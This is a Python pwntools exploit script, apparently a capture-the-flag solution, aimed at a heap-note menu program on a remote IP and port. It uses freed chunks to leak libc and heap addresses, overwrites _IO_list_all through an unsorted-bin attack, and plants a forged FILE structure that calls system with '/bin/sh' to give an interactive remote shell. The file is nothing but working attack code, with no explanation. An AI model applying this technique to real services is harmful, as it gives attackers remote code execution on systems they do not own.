#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "10.211.55.13"
#port = 8888
host = "104.199.25.43"
port = 1337
r = remote(host,port)


def alloc(idx):
    r.recvuntil("4) free\n")
    r.sendline("1")
    r.recvuntil("9)")
    r.sendline(str(idx))

def write(idx,data):
    r.recvuntil("4) free\n")
    r.sendline("2")
    r.recvuntil("9)")
    r.sendline(str(idx))
    time.sleep(0.2)
    r.sendline(data)

def puts(idx):
    r.recvuntil("4) free\n")
    r.sendline("3")
    r.recvuntil("9)")
    r.sendline(str(idx))

def free(idx):
    r.recvuntil("4) free\n")
    r.sendline("4")
    r.recvuntil("9)")
    r.sendline(str(idx))

alloc(0)
alloc(1)
alloc(2)
alloc(3)
alloc(4)
free(1)
free(3)
puts(1)
r.recvuntil("\n")
libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x3c1b58
print "libc:",hex(libc)
puts(3)
r.recvuntil("\n")
heap = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x310
print "heap:", hex(heap)
dl_open_hook = libc + 0x3c62e0
fastmax = libc + 0x3c37d0
wstr_finish = libc  +0x3bdbd0 - 0x18
system = libc + 0x456a0
fake = heap+0x640
sh = libc + 0x18ac40
write(1,p64(0) + p64(fake))
payload = p64(0)*2 + p64(0) +  p64(0x61) + p64(0) + p64(heap+0x930) + p64(0) + p64(1) +p64(0)*6 + p64(0) + p64(0x21)
payload = payload.ljust(0xb0,"\x00") + p64(heap+0x700)
payload = payload.ljust(0xe8,"\x00") + p64(wstr_finish) + p64(0) + p64(system)
payload += p64(sh)
write(2,payload)
alloc(5)
alloc(5)
free(0)
list_all = libc + 0x3c2500

write(0,p64(0) + p64(list_all-0x10))
alloc(6)
free(0)
r.interactive()
